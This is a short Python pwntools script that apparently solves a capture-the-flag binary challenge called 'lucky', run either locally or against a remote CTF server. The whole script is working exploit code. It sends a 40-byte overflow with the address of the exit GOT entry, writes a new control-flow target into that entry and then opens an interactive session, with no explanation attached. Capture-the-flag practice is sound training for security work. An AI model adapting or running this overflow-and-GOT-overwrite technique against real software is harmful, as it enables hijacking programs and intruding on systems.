#!/usr/bin/python3

from pwn import *
import sys

bname = './lucky'
context.binary = bname
e = ELF(bname)

if len(sys.argv) > 1:
    r = remote('ctf.adl.tw', 11003)
else:
    r = process(bname)

r.send(b'A'*40 + p64(e.got['exit']))
r.sendline(str(0x4008f1))
r.sendline(str(0))

r.interactive()
